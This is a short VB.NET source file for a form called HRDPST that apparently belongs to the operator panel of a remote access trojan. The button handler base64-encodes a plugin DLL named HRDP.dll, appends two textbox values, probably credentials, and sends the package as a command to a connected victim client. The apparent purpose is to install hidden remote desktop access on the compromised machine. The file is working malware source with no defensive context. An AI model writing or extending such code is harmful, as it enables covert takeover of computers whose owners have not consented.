Imports System.IO

Public Class HRDPST
    Public C As Client
    Private Sub HRDPST_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Server.updater()
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Try
            Dim B As Byte() = SB("hrdp+" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\HRDP.dll")) & Settings.SPL & TextBox1.Text & Settings.SPL & TextBox2.Text)
            Me.Button2.Enabled = False
            ToolStripStatusLabel1.ForeColor = Color.White
            ToolStripStatusLabel1.Text = "Please Wait..."
            Dim ClientReq As New Outcoming_Requests(C, B)
            Pending.Req_Out.Add(ClientReq)
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            If Not C.IsConnected Then
                Me.Close()
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub
End Class